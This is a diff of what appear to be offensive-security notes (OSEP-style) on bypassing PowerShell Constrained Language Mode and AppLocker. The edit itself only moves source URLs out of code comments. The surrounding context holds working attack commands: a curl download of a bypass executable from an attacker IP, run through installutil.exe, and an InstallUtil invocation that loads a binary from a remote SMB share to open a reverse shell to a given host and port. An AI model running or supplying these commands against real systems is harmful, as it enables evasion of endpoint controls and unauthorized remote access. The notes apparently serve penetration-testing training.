@@ -2345,16 +2345,17 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
 
 CLM Bypass via Install Util
+https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/AppLocker%20Bypass%20PowerShell%20Runspace/Program.cs
 ```powershell
-#https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/AppLocker%20Bypass%20PowerShell%20Runspace/Program.cs
 curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 ```
 
 Alt CLM Bypass via Install Util
+https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
 ```powershell
 #alt to using smb share is dropping to disk C;\windows\tasks etc
-#https://github.com/padovah4ck/PSByPassCLM/blob/master/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe
+
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U \\10.13.14.15\pwn\PSBypassCLM.exe
 ```
 
